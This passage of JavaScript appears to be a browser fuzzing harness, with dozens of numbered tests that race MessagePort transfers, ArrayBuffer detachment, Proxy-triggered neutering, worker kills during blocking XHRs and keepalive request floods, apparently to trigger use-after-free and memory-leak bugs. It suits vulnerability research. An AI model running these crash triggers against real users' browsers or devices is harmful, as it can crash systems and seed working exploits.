            mc1.port1.postMessage(mc2.port2, [mc2.port2]);
            mc2.port1.close();
            chain.splice(idx+1, 1);
            chain.push(new MessageChannel());
        } catch(e) {}
    }, 5);
    setTimeout(function(){ clearInterval(t); log("239: Done"); }, 4000);
}

function runTest240() {
    log("240. Mbuf Abort...");
    var data = new Uint8Array(32768).fill(0xCC);
    var reqs = [];
    var t = setInterval(function() {
        try {
            var x = new XMLHttpRequest();
            x.open("POST", "/socket_stress", true);
            x.send(data);
            reqs.push(x);
            if(reqs.length > 80) {
                var old = reqs.shift();
                old.abort();
            }
        } catch(e){}
    }, 2);
    setTimeout(function(){ clearInterval(t); log("240: Done"); }, 4000);
}
function runTest241() {
    log("241. Orphan Race...");
    var code = `
        self.onmessage = function(e) {
            var arr = [];
            for(var i=0; i<10000; i++) arr.push({a: i, b: new Uint8Array(1024)});
            postMessage("done");
        };
    `;
    var u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var t = setInterval(function() {
        var w = new Worker(u);
        w.postMessage("go");
        var huge = new ArrayBuffer(1024 * 1024 * 5);
        URL.revokeObjectURL(u);
        setTimeout(() => { w.terminate(); }, 10);
        u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    }, 40);
    setTimeout(function(){ clearInterval(t); log("241: Done"); }, 4000);
}

function runTest242() {
    log("242. Port Self-Ref...");
    var mc = new MessageChannel();
    var p1 = mc.port1;
    var p2 = mc.port2;
    var t = setInterval(function() {
        try {
            var sub = new MessageChannel();
            p1.postMessage(sub.port1, [sub.port1]);
            sub.port2.postMessage(p2, [p2]);
            p1.close();
            mc = new MessageChannel();
            p1 = mc.port1; p2 = mc.port2;
        } catch(e) {}
    }, 5);
    setTimeout(function(){ clearInterval(t); log("242: Done"); }, 4000);
}

function runTest243() {
    log("243. Stale Pointer...");
    var buf = new ArrayBuffer(1024 * 1024);
    var view = new Float64Array(buf);
    view[0] = 1.234;
    var w = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){postMessage("k");}'],{type:'text/javascript'})));
    var t = setInterval(function() {
        if(buf.byteLength > 0) {
            w.postMessage(buf, [buf]);
            try {
                var val = view[0];
                log("243 Fail: Read " + val);
            } catch(e) {}
        } else {
            buf = new ArrayBuffer(1024 * 1024);
            view = new Float64Array(buf);
            view[0] = 1.1;
        }
    }, 10);
    setTimeout(function(){ clearInterval(t); w.terminate(); log("243: Done"); }, 4000);
}

function runTest244() {
    log("244. Zombie Thread...");
    var code = "onmessage=function(){var x=new XMLHttpRequest();x.open('GET','http://127.0.0.1:9090',false);try{x.send();}catch(e){}}";
    var u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var pool = [];
    var t = setInterval(function() {
        var w = new Worker(u);
        w.postMessage("run");
        pool.push(w);
        if(pool.length > 40) {
            var k = pool.shift();
            k.terminate();
        }
    }, 20);
    setTimeout(function(){ clearInterval(t); pool.forEach(x=>x.terminate()); log("244: Done"); }, 5000);
}

function runTest245() {
    log("245. IPC Fragment...");
    var ports = [];
    for(var i=0; i<300; i++) ports.push(new MessageChannel());
    var t = setInterval(function() {
        try {
            var idx = Math.floor(Math.random() * (ports.length - 1));
            var a = ports[idx];
            var b = ports[idx+1];
            a.port1.postMessage(b.port1, [b.port1]);
            ports.splice(idx+1, 1);
            if(ports.length < 50) ports.push(new MessageChannel());
        } catch(e) {}
    }, 5);
    setTimeout(function(){ clearInterval(t); log("245: Done"); }, 4000);
}

function runTest246() {
    log("246. Mbuf Storm...");
    var data = new Uint8Array(65536).fill(0xEE);
    var reqs = [];
    var t = setInterval(function() {
        try {
            var x = new XMLHttpRequest();
            x.open("POST", "/mbuf_leak_" + Math.random(), true);
            x.send(data);
            reqs.push(x);
            if(reqs.length > 150) {
                var old = reqs.shift();
                old.abort();
            }
        } catch(e){}
    }, 2);
    setTimeout(function(){ clearInterval(t); log("246: Done"); }, 4000);
}
function runTest247() {
    log("247. IPC Bounce...");
    var code = `
        self.onmessage = function(e) {
            try {
                if(e.data.byteLength > 0) {
                    postMessage(e.data, [e.data]);
                } else {
                    var r = new Uint8Array(1024*1024);
                    postMessage(r.buffer, [r.buffer]);
                }
            } catch(z){}
        };
    `;
    var u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var w = new Worker(u);
    var buf = new ArrayBuffer(1024 * 1024);
    w.onmessage = function(e) {
        w.terminate();
        w = new Worker(u);
        w.onmessage = arguments.callee;
        try { w.postMessage(e.data, [e.data]); } catch(x){}
    };
    w.postMessage(buf, [buf]);
    setTimeout(function(){ if(w) w.terminate(); URL.revokeObjectURL(u); log("247: Done"); }, 4000);
}

function runTest248() {
    log("248. Detach Trap...");
    var buf = new ArrayBuffer(1024 * 1024);
    var view = new Uint8Array(buf);
    view[0] = 1;
    var mc = new MessageChannel();
    var t = setInterval(function() {
        try {
            if(buf.byteLength > 0) {
                var w = new Worker(URL.createObjectURL(new Blob([''],{type:'text/javascript'})));
                w.postMessage(buf, [buf]);
                w.terminate();
                if(view.byteLength === 0) {
                    var read = view[0]; 
                    log("248 Fail: " + read);
                }
            } else {
                buf = new ArrayBuffer(1024 * 1024);
                view = new Uint8Array(buf);
                view[0] = 2;
            }
        } catch(e) {}
    }, 10);
    setTimeout(function(){ clearInterval(t); log("248: Done"); }, 4000);
}

function runTest249() {
    log("249. Blob Circular...");
    var blobs = [];
    var urls = [];
    for(var k=0; k<100; k++) {
        var b = new Blob([new Uint8Array(1024)]);
        blobs.push(b);
        urls.push(URL.createObjectURL(b));
    }
    var t = setInterval(function() {
        var idx = Math.floor(Math.random() * 50);
        var u = urls[idx];
        var w = new Worker(u);
        w.onmessage = function(e) {}; 
        w.terminate();
        URL.revokeObjectURL(u);
        urls[idx] = URL.createObjectURL(blobs[idx]);
        var pressure = new Float64Array(1024 * 512);
    }, 10);
    setTimeout(function(){ clearInterval(t); log("249: Done"); }, 4000);
}

function runTest250() {
    log("250. Sync Kill...");
    var code = `
        onmessage = function() {
            var x = new XMLHttpRequest();
            x.open("GET", "http://127.0.0.1:5555", false);
            try { x.send(); } catch(e){}
        };
    `;
    var u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var pool = [];
    var t = setInterval(function() {
        for(var i=0; i<5; i++) {
            var w = new Worker(u);
            w.postMessage("run");
            pool.push(w);
        }
        while(pool.length > 40) {
            var v = pool.shift();
            v.terminate();
        }
    }, 30);
    setTimeout(function(){ clearInterval(t); pool.forEach(x=>x.terminate()); log("250: Done"); }, 5000);
}

function runTest251() {
    log("251. Deep Free...");
    var root = new MessageChannel();
    var curr = root;
    var t = setInterval(function() {
        try {
            var next = new MessageChannel();
            curr.port1.postMessage(next.port2, [next.port2]);
            curr = next;
            var load = new Uint8Array(1024);
            curr.port1.postMessage(load);
            if(Math.random() > 0.95) {
                root.port1.close();
                root.port2.close();
                root = new MessageChannel();
                curr = root;
            }
        } catch(e){}
    }, 2);
    setTimeout(function(){ clearInterval(t); log("251: Done"); }, 4000);
}

function runTest252() {
    log("252. Mbuf Leak...");
    var blob = new Blob([new Uint8Array(1024 * 1024)]);
    var reqs = [];
    var c = new AbortController();
    var t = setInterval(function() {
        try {
            fetch("/mbuf_flood", {
                method: "POST",
                body: blob,
                signal: c.signal,
                keepalive: true
            }).catch(e=>{});
            reqs.push(c);
            c = new AbortController();
            if(reqs.length > 80) {
                var old = reqs.shift();
                old.abort();
            }
        } catch(e){}
    }, 5);
    setTimeout(function(){ clearInterval(t); log("252: Done"); }, 5000);
}
function runTest253() {
    log("253. Graph GC Race...");
    var code = `
        self.onmessage = function(e) {
            var root = { next: null };
            var curr = root;
            for(var i=0; i<2000; i++) {
                curr.next = { d: new Uint8Array(128), p: e.data };
                curr = curr.next;
            }
            postMessage(root);
        };
    `;
    var u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var t = setInterval(function() {
        var w = new Worker(u);
        var buf = new ArrayBuffer(1024*1024);
        w.postMessage(buf, [buf]);
        w.onmessage = function(e) { w.terminate(); };
        var pressure = new Float64Array(1024*512);
        w.terminate();
    }, 25);
    setTimeout(function(){ clearInterval(t); URL.revokeObjectURL(u); log("253: Done"); }, 4000);
}

function runTest254() {
    log("254. Circular Trap...");
    var mc = new MessageChannel();
    var p1 = mc.port1;
    var p2 = mc.port2;
    var t = setInterval(function() {
        try {
            var sub = new MessageChannel();
            p1.postMessage(sub.port1, [sub.port1]);
            sub.port2.postMessage(p2, [p2]);
            var load = new Uint8Array(4096);
            p1.postMessage(load);
            if(Math.random() > 0.6) {
                p1.close();
                mc = new MessageChannel();
                p1 = mc.port1; p2 = mc.port2;
            }
        } catch(e) {}
    }, 5);
    setTimeout(function(){ clearInterval(t); log("254: Done"); }, 4000);
}

function runTest255() {
    log("255. Proxy Neuter...");
    var buf = new ArrayBuffer(1024 * 1024);
    var view = new Uint8Array(buf);
    view[0] = 99;
    var w = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){postMessage("k");}'],{type:'text/javascript'})));
    var p = new Proxy(buf, {
        get: function(target, prop) {
            if(prop === 'byteLength') {
                w.postMessage(buf, [buf]);
                return 0;
            }
            return Reflect.get(target, prop);
        }
    });
    try {
        var len = p.byteLength;
        var val = view[0];
        log("255 Fail: " + val);
    } catch(e) { log("255 Trapped"); }
    setTimeout(function(){ w.terminate(); log("255: Done"); }, 2000);
}

function runTest256() {
    log("256. Sleep Queue...");
    var code = `
        onmessage = function() {
            var x = new XMLHttpRequest();
            x.open("GET", "http://192.168.1.1:65000", false);
            try { x.send(); } catch(e){}
        };
    `;
    var u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var pool = [];
    var t = setInterval(function() {
        for(var i=0; i<4; i++) {
            var w = new Worker(u);
            w.postMessage("run");
            pool.push(w);
        }
        if(pool.length > 30) {
            var batch = pool.splice(0, 15);
            batch.forEach(k => k.terminate());
        }
    }, 30);
    setTimeout(function(){ clearInterval(t); pool.forEach(x=>x.terminate()); log("256: Done"); }, 5000);
}

function runTest257() {
    log("257. Descriptor Exhaust...");
    var ports = [];
    for(var i=0; i<100; i++) ports.push(new MessageChannel());
    var t = setInterval(function() {
        try {
            var len = ports.length;
            if(len < 2) {
                ports.push(new MessageChannel());
                return;
            }
            var idx = Math.floor(Math.random() * (len - 1));
            ports[idx].port1.postMessage(ports[idx+1].port2, [ports[idx+1].port2]);
            if(len > 120) {
                var d = ports.shift();
                d.port1.close();
            } else {
                ports.push(new MessageChannel());
            }
        } catch(e){}
    }, 5);
    setTimeout(function(){ clearInterval(t); log("257: Done"); }, 4000);
}

function runTest258() {
    log("258. KeepAlive Leak...");
    var blob = new Blob([new Uint8Array(65536).fill(0xCC)]);
    var reqs = [];
    var c = new AbortController();
    var t = setInterval(function() {
        try {
            fetch("/mbuf_keepalive", {
                method: "POST",
                body: blob,
                signal: c.signal,
                keepalive: true
            }).catch(e=>{});
            reqs.push(c);
            c = new AbortController();
            if(reqs.length > 70) {
                var old = reqs.shift();
                old.abort();
            }
        } catch(e){}
    }, 5);
    setTimeout(function(){ clearInterval(t); log("258: Done"); }, 5000);
}
function runTest259() {
    log("259. Graph Race...");
    var code = `
        self.onmessage = function(e) {
            var root = {n: null, d: new Uint8Array(1024)};
            var ptr = root;
            for(var i=0; i<3000; i++) {
                ptr.n = {n: null, d: new Uint8Array(512), r: root};
                ptr = ptr.n;
            }
            postMessage(root);
        };
    `;
    var u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var t = setInterval(function() {
        var w = new Worker(u);
        w.postMessage("go");
        w.onmessage = function(e) { var d = e.data; }; 
        var load = new Float64Array(1024 * 256);
        w.terminate();
    }, 30);
    setTimeout(function(){ clearInterval(t); URL.revokeObjectURL(u); log("259: Done"); }, 4000);
}

function runTest260() {
    log("260. Port Masquerade...");
    var mc = new MessageChannel();
    var p1 = mc.port1;
    var t = setInterval(function() {
        try {
            var sub = new MessageChannel();
            var payload = {
                a: sub.port1,
                b: new Uint8Array(1024)
            };
            p1.postMessage(payload, [sub.port1]);
            sub.port2.postMessage("ping");
            sub.port2.close();
            if(Math.random() > 0.7) {
                p1.close();
                mc = new MessageChannel();
                p1 = mc.port1;
            }
        } catch(e) {}
    }, 5);
    setTimeout(function(){ clearInterval(t); log("260: Done"); }, 4000);
}

function runTest261() {
    log("261. Slice Trap...");
    var buf = new Uint8Array(1024 * 1024 * 2);
    var b = new Blob([buf]);
    var t = setInterval(function() {
        var u = URL.createObjectURL(b);
        var s1 = b.slice(0, 1024);
        var s2 = b.slice(0, 1024); 
        var w = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){postMessage(e.data);}'],{type:'text/javascript'})));
        w.postMessage(s1);
        URL.revokeObjectURL(u);
        w.terminate();
        var r = new FileReader();
        r.readAsArrayBuffer(s2);
    }, 15);
    setTimeout(function(){ clearInterval(t); log("261: Done"); }, 4000);
}

function runTest262() {
    log("262. Sleep Queue...");
    var code = `
        onmessage = function() {
            var x = new XMLHttpRequest();
            x.open("GET", "http://127.0.0.1:31337", false);
            try { x.send(); } catch(e){}
        };
    `;
    var u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var pool = [];
    var t = setInterval(function() {
        for(var i=0; i<3; i++) {
            var w = new Worker(u);
            w.postMessage("run");
            pool.push(w);
        }
        if(pool.length > 25) {
            var batch = pool.splice(0, 10);
            batch.forEach(k => k.terminate());
        }
    }, 40);
    setTimeout(function(){ clearInterval(t); pool.forEach(x=>x.terminate()); log("262: Done"); }, 5000);
}

function runTest263() {
    log("263. IPC Deadlock...");
    var chain = [];
    for(var i=0; i<80; i++) chain.push(new MessageChannel());
    var t = setInterval(function() {
        try {
            var idx = Math.floor(Math.random() * (chain.length - 2));
            var a = chain[idx];
            var b = chain[idx+1];
            a.port1.postMessage(b.port2, [b.port2]);
            var load = new Uint8Array(2048);
            b.port1.postMessage(load);
            if(Math.random() > 0.9) {
                chain[idx].port1.close();
                chain[idx] = new MessageChannel();
            }
        } catch(e) {}
    }, 5);
    setTimeout(function(){ clearInterval(t); log("263: Done"); }, 4000);
}

function runTest264() {
    log("264. Mbuf Cluster...");
    var chunk = new Uint8Array(65536).fill(0xAA);
    var reqs = [];
    var c = new AbortController();
    var t = setInterval(function() {
        try {
            fetch("/mbuf_cluster_race", {
                method: "POST", 
                body: chunk, 
                signal: c.signal,
                keepalive: true
            }).catch(e=>{});
            reqs.push(c);
            c = new AbortController();
            if(reqs.length > 60) {
                var old = reqs.shift();
                old.abort();
            }
        } catch(e) {}
    }, 4);
    setTimeout(function(){ clearInterval(t); log("264: Done"); }, 5000);
}
function runTest265() {
    log("265. Cascade...");
    var code = `self.onmessage=function(e){if(e.data>0){var w=new Worker(self.location.href);w.postMessage(e.data-1);var b=new Uint8Array(1024*1024);while(new Date().getTime()%2!==0){}}}`;
    var u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var t = setInterval(function(){
        var w = new Worker(u);
        w.postMessage(10);
        setTimeout(function(){ w.terminate(); }, 20);
        var p = new ArrayBuffer(1024*1024*2);
    }, 50);
    setTimeout(function(){ clearInterval(t); URL.revokeObjectURL(u); log("265: Done"); }, 4000);
}

function runTest266() {
    log("266. Flux...");
    var pool = [];
    var t = setInterval(function(){
        for(var i=0; i<20; i++){
            var c = new MessageChannel();
            c.port1.postMessage(new ArrayBuffer(256), [new ArrayBuffer(256)]);
            pool.push(c);
        }
        while(pool.length > 50){
            var x = pool.shift();
            x.port1.close();
            x.port2.close();
        }
    }, 10);
    setTimeout(function(){ clearInterval(t); log("266: Done"); }, 4000);
}

function runTest267() {
    log("267. Neuter Race...");
    var buf = new ArrayBuffer(1024 * 1024 * 4);
    var view = new Uint8Array(buf);
    var w = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){postMessage("ack");}'],{type:'text/javascript'})));
    var t = setInterval(function(){
        if(buf.byteLength > 0){
            w.postMessage(buf, [buf]);
            try { var v = view[0]; log("267 Fail: "+v); } catch(e){}
        } else {
            buf = new ArrayBuffer(1024 * 1024 * 4);
            view = new Uint8Array(buf);
        }
    }, 5);
    setTimeout(function(){ clearInterval(t); w.terminate(); log("267: Done"); }, 4000);
}

function runTest268() {
    log("268. Sync Kill...");
    var code = "onmessage=function(){var x=new XMLHttpRequest();x.open('GET','http://127.0.0.1:58888',false);try{x.send()}catch(e){}}";
    var u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var pool = [];
    var t = setInterval(function(){
        var w = new Worker(u);
        w.postMessage("go");
        pool.push(w);
        if(pool.length > 15) pool.shift().terminate();
    }, 30);
    setTimeout(function(){ clearInterval(t); pool.forEach(k=>k.terminate()); URL.revokeObjectURL(u); log("268: Done"); }, 4000);
}

function runTest269() {
    log("269. Circular Chain...");
    var t = setInterval(function(){
        var c1 = new MessageChannel();
        var c2 = new MessageChannel();
        c1.port1.postMessage(c2.port2, [c2.port2]);
        c2.port1.postMessage(c1.port2, [c1.port2]);
        var load = new Uint8Array(4096);
        c1.port1.postMessage(load);
        c1 = null; c2 = null;
        var gc = new ArrayBuffer(1024*1024*4);
    }, 10);
    setTimeout(function(){ clearInterval(t); log("269: Done"); }, 4000);
}

function runTest270() {
    log("270. Mbuf Cluster...");
    var data = new Uint8Array(65536).fill(0xCC);
    var reqs = [];
    var t = setInterval(function(){
        try {
            var x = new XMLHttpRequest();
            x.open("POST", "/mbuf_frag_race", true);
            x.send(data);
            reqs.push(x);
            if(reqs.length > 60) reqs.shift().abort();
        } catch(e){}
    }, 5);
    setTimeout(function(){ clearInterval(t); log("270: Done"); }, 4000);
}
function runTest271() {
    log("270. Graph GC Trap...");
    var code = `
        self.onmessage = function(e) {
            var root = e.data;
            var curr = root;
            while(curr && curr.next) {
                curr.b = new Uint8Array(1024);
                curr = curr.next;
            }
            postMessage(root);
        };
    `;
    var u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var t = setInterval(function() {
        var w = new Worker(u);
        var root = {id: 0, next: null};
        var ptr = root;
        for(var i=0; i<3000; i++) {
            ptr.next = {id: i, next: null, buf: new ArrayBuffer(128)};
            ptr = ptr.next;
        }
        w.postMessage(root);
        var pressure = [];
        for(var k=0; k<100; k++) pressure.push(new Float64Array(4096));
        setTimeout(function(){ w.terminate(); }, 10);
    }, 40);
    setTimeout(function(){ clearInterval(t); URL.revokeObjectURL(u); log("270: Done"); }, 4000);
}

function runTest272() {
    log("271. Entangle Race...");
    var channels = [];
    var t = setInterval(function() {
        try {
            var c1 = new MessageChannel();
            var c2 = new MessageChannel();
            c1.port1.onmessage = function(e) { e.data.close(); };
            c2.port1.onmessage = function(e) { e.data.postMessage("ping"); };
            c1.port2.postMessage(c2.port2, [c2.port2]);
            c2.port1.postMessage(c1.port1, [c1.port1]);
            channels.push(c2.port1);
            if(channels.length > 50) {
                var v = channels.shift();
                v.close();
            }
            var b = new Uint8Array(1024*1024);
        } catch(e){}
    }, 5);
    setTimeout(function(){ clearInterval(t); log("271: Done"); }, 4000);
}

function runTest273() {
    log("272. Stale View...");
    var buf = new ArrayBuffer(1024 * 1024);
    var view = new Int32Array(buf);
    view[0] = 0x12345678;
    var w = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){postMessage("a");}'],{type:'text/javascript'})));
    var t = setInterval(function() {
        if(buf.byteLength > 0) {
            w.postMessage(buf, [buf]);
            try {
                var v = view[0];
                if(v === undefined) throw "Detached";
                log("272 Fail: " + v);
            } catch(e) {}
        } else {
            buf = new ArrayBuffer(1024 * 1024);
            view = new Int32Array(buf);
            view[0] = 0x87654321;
        }
        var junk = new ArrayBuffer(1024 * 256);
    }, 5);
    setTimeout(function(){ clearInterval(t); w.terminate(); log("272: Done"); }, 4000);
}

function runTest274() {
    log("273. Scheduler Chaos...");
    var code = `
        self.onmessage = function() {
            var x = new XMLHttpRequest();
            x.open("GET", "http://127.0.0.1:49152", false);
            try { x.send(); } catch(e){}
        };
    `;
    var u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var pool = [];
    var t = setInterval(function() {
        for(var i=0; i<4; i++) {
            var w = new Worker(u);
            w.postMessage("start");
            pool.push(w);
        }
        if(pool.length > 20) {
            var count = Math.floor(Math.random() * 10) + 1;
            for(var j=0; j<count; j++) {
                if(pool.length > 0) pool.shift().terminate();
            }
        }
    }, 25);
    setTimeout(function(){ clearInterval(t); pool.forEach(x=>x.terminate()); URL.revokeObjectURL(u); log("273: Done"); }, 5000);
}

function runTest275() {
    log("274. IPC Ring Panic...");
    var rings = [];
    var t = setInterval(function() {
        try {
            var start = new MessageChannel();
            var prev = start;
            for(var i=0; i<40; i++) {
                var next = new MessageChannel();
                prev.port1.postMessage(next.port2, [next.port2]);
                prev = next;
            }
            prev.port1.postMessage(start.port2, [start.port2]);
            rings.push(start);
            if(rings.length > 10) {
                var dead = rings.shift();
                dead.port1.close(); 
            }
            var gc = new ArrayBuffer(1024*1024);
        } catch(e){}
    }, 15);
    setTimeout(function(){ clearInterval(t); log("274: Done"); }, 4000);
}

function runTest276() {
    log("275. Mbuf Storm...");
    var blob = new Blob([new Uint8Array(65536).fill(0xCC)]);
    var controllers = [];
    var t = setInterval(function() {
        try {
            var c = new AbortController();
            fetch("/mbuf_fragmentation", {
                method: "POST",
                body: blob,
                signal: c.signal,
                keepalive: true
            }).catch(e=>{});
            controllers.push(c);
            if(controllers.length > 80) {
                var batch = controllers.splice(0, 40);
                batch.forEach(ctl => ctl.abort());
            }
        } catch(e){}
    }, 5);
    setTimeout(function(){ clearInterval(t); log("275: Done"); }, 4000);
}
function runTest277() {
    log("277. Graph GC Race...");
    var code = `
        self.onmessage = function(e) {
            var root = {n: null, d: new Float64Array(128)};
            var curr = root;
            for(var i=0; i<4000; i++) {
                curr.n = {n: null, d: new Uint8Array(64), r: root};
                curr = curr.n;
            }
            if(e.data > 0) {
                var w = new Worker(self.location.href);
                w.postMessage(e.data - 1);
            }
            postMessage(root);
        };
    `;
    var u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var workers = [];
    var t = setInterval(function() {
        var w = new Worker(u);
        w.onmessage = function(e) { e.data = null; };
        w.postMessage(3);
        workers.push(w);
        if(workers.length > 10) {
            var k = workers.shift();
            k.terminate();
        }
        var pressure = new ArrayBuffer(1024 * 1024 * 2);
    }, 40);
    setTimeout(function(){ clearInterval(t); workers.forEach(x=>x.terminate()); URL.revokeObjectURL(u); log("277: Done"); }, 4000);
}

function runTest278() {
    log("278. Port UAF...");
    var channels = [];
    var t = setInterval(function() {
        try {
            var c1 = new MessageChannel();
            var c2 = new MessageChannel();
            var c3 = new MessageChannel();
            c1.port1.postMessage(c2.port2, [c2.port2]);
            c2.port1.onmessage = function(e) {
                e.data.postMessage(c3.port2, [c3.port2]);
                e.data.close();
            };
            c3.port1.onmessage = function(e) { e.data.close(); };
            var load = new Uint8Array(4096);
            c2.port1.postMessage(load);
            c1.port1.close();
            channels.push(c3.port1);
            if(channels.length > 40) channels.shift().close();
        } catch(e) {}
    }, 10);
    setTimeout(function(){ clearInterval(t); log("278: Done"); }, 4000);
}

function runTest279() {
    log("279. Proxy Neuter...");
    var buf = new ArrayBuffer(1024 * 1024);
    var view = new Uint8Array(buf);
    view[0] = 0xAA;
    var w = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){postMessage("ack");}'],{type:'text/javascript'})));
    var p = new Proxy(buf, {
        get: function(target, prop) {
            if(prop === 'byteLength') {
                w.postMessage(buf, [buf]);
                return 0;
            }
            return Reflect.get(target, prop);
        }
    });
    var t = setInterval(function() {
        try {
            if(buf.byteLength > 0) {
                var len = p.byteLength; 
                if(view.length > 0 && view[0] === 0xAA) {} 
            } else {
                buf = new ArrayBuffer(1024 * 1024);
                view = new Uint8Array(buf);
                view[0] = 0xAA;
                p = new Proxy(buf, {
                    get: function(t, k) {
                        if(k==='byteLength'){ w.postMessage(buf, [buf]); return 0; }
                        return Reflect.get(t, k);
                    }
                });
            }
        } catch(e) { log("279 Trap: "+e.message); }
    }, 15);
    setTimeout(function(){ clearInterval(t); w.terminate(); log("279: Done"); }, 4000);
}

function runTest280() {
    log("280. Sync Kill...");
    var code = `
        self.onmessage = function() {
            var x = new XMLHttpRequest();
            x.open("GET", "http://127.0.0.1:22222", false);
            try { x.send(); } catch(e){}
        };
    `;
    var u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var pool = [];
    var t = setInterval(function() {
        for(var i=0; i<5; i++) {
            var w = new Worker(u);
            w.postMessage("run");
            pool.push(w);
        }
        if(pool.length > 30) {
            var batch = pool.splice(0, 15);
            batch.forEach(k => k.terminate());
            var spray = new ArrayBuffer(1024 * 1024);
        }
    }, 40);
    setTimeout(function(){ clearInterval(t); pool.forEach(x=>x.terminate()); log("280: Done"); }, 5000);
}

function runTest281() {
    log("281. IPC Topology...");
    var ports = [];
    for(var i=0; i<150; i++) ports.push(new MessageChannel());
    var t = setInterval(function() {
        try {
            var count = Math.floor(Math.random() * 20);
            for(var k=0; k<count; k++) {
                var a = Math.floor(Math.random() * ports.length);
                var b = Math.floor(Math.random() * ports.length);
                if(a !== b) {
                    ports[a].port1.postMessage(ports[b].port2, [ports[b].port2]);
                    ports[b] = new MessageChannel(); 
                }
            }
            if(ports.length > 200) {
                ports.splice(0, 50).forEach(mc => { mc.port1.close(); mc.port2.close(); });
            }
        } catch(e) {}
    }, 10);
    setTimeout(function(){ clearInterval(t); log("281: Done"); }, 4000);
}

function runTest282() {
    log("282. Mbuf Race...");
    var data = new Uint8Array(65536).fill(0xFE);
    var reqs = [];
    var t = setInterval(function() {
        try {
            var c = new AbortController();
            fetch("/mbuf_race_condition", {
                method: "POST",
                body: data,
                signal: c.signal,
                keepalive: true
            }).catch(e=>{});
            reqs.push(c);
            if(reqs.length > 100) {
                var old = reqs.shift();
                old.abort();
            }
            var pressure = new ArrayBuffer(1024 * 512);
        } catch(e){}
    }, 4);
    setTimeout(function(){ clearInterval(t); log("282: Done"); }, 4000);
}
function runTest283() {
    log("283. Blob Trap...");
    var code = `
        self.onmessage = function(e) {
            if(e.data.depth > 0) {
                var w = new Worker(self.location.href);
                w.postMessage({depth: e.data.depth - 1, b: e.data.b});
                var arr = new Float64Array(1024);
                while(new Date().getTime() % 4 !== 0){}
                w.terminate();
            }
        };
    `;
    var b = new Blob([new Uint8Array(1024*1024)]);
    var u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var t = setInterval(function() {
        var w = new Worker(u);
        w.postMessage({depth: 20, b: b});
        var pressure = new ArrayBuffer(1024 * 1024 * 2);
        setTimeout(function() { w.terminate(); }, 50);
        URL.revokeObjectURL(u);
        u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    }, 100);
    setTimeout(function(){ clearInterval(t); log("283: Done"); }, 4000);
}

function runTest284() {
    log("284. Masquerade...");
    var t = setInterval(function() {
        try {
            var c1 = new MessageChannel();
            var c2 = new MessageChannel();
            var o = {
                a: c1.port1,
                b: {
                    c: c2.port2,
                    d: new Uint8Array(2048)
                }
            };
            c1.port2.postMessage(o, [c1.port1, c2.port2]);
            c2.port1.onmessage = function(e) {
                e.data.close();
                var junk = new ArrayBuffer(4096);
            };
            c2.port1.postMessage("trigger");
            if(Math.random() > 0.8) {
                c1.port2.close();
                c2.port1.close();
            }
        } catch(e) {}
    }, 10);
    setTimeout(function(){ clearInterval(t); log("284: Done"); }, 4000);
}

function runTest285() {
    log("285. Proxy Neuter...");
    var buf = new ArrayBuffer(1024 * 1024);
    var view = new Uint8Array(buf);
    view[0] = 0xFF;
    var w = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){postMessage("k");}'],{type:'text/javascript'})));
    var p = new Proxy(buf, {
        get: function(target, prop) {
            if(prop === 'byteLength' || prop === 'length') {
                w.postMessage(buf, [buf]);
                return 0;
            }
            return Reflect.get(target, prop);
        }
    });
    var t = setInterval(function() {
        try {
            if(buf.byteLength > 0) {
                var len = p.byteLength;
                // Acesso perigoso pós-transferência se a otimização falhar
                if(view.length > 0 && view[0] === 0xFF) {}
            } else {
                buf = new ArrayBuffer(1024 * 1024);
                view = new Uint8Array(buf);
                view[0] = 0xFF;
                // Recria proxy
                p = new Proxy(buf, {
                    get: function(ta, k) {
                        if(k==='byteLength'){ w.postMessage(buf, [buf]); return 0; }
                        return Reflect.get(ta, k);
                    }
                });
            }
        } catch(e) {}
    }, 10);
    setTimeout(function(){ clearInterval(t); w.terminate(); log("285: Done"); }, 4000);
}

function runTest286() {
    log("286. Sleep Queue...");
    var code = `
        self.onmessage = function() {
            var x = new XMLHttpRequest();
            // Porta bloqueada ou host inalcançável para forçar sleep no kernel
            x.open("GET", "http://192.168.255.255:60000", false);
            try { x.send(); } catch(e){}
        };
    `;
    var u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var pool = [];
    var t = setInterval(function() {
        for(var i=0; i<8; i++) {
            var w = new Worker(u);
            w.postMessage("go");
            pool.push(w);
        }
        // Mata threads em massa enquanto estão em cv_wait
        if(pool.length > 40) {
            var batch = pool.splice(0, 20);
            batch.forEach(k => k.terminate());
            var memory = new ArrayBuffer(1024 * 1024);
        }
    }, 35);
    setTimeout(function(){ clearInterval(t); pool.forEach(k=>k.terminate()); log("286: Done"); }, 5000);
}

function runTest287() {
    log("287. Braided Chain...");
    var ports = [];
    for(var i=0; i<100; i++) ports.push(new MessageChannel());
    var t = setInterval(function() {
        try {
            // Cria topologia complexa: A -> B, A -> C, B -> D
            var idx = Math.floor(Math.random() * (ports.length - 3));
            var pA = ports[idx];
            var pB = ports[idx+1];
            var pC = ports[idx+2];
            
            pA.port1.postMessage(pB.port2, [pB.port2]);
            pA.port1.postMessage(pC.port2, [pC.port2]);
            pB.port1.postMessage(pC.port1, [pC.port1]);
            
            // Destruição aleatória para forçar recálculo de refcount em cascata
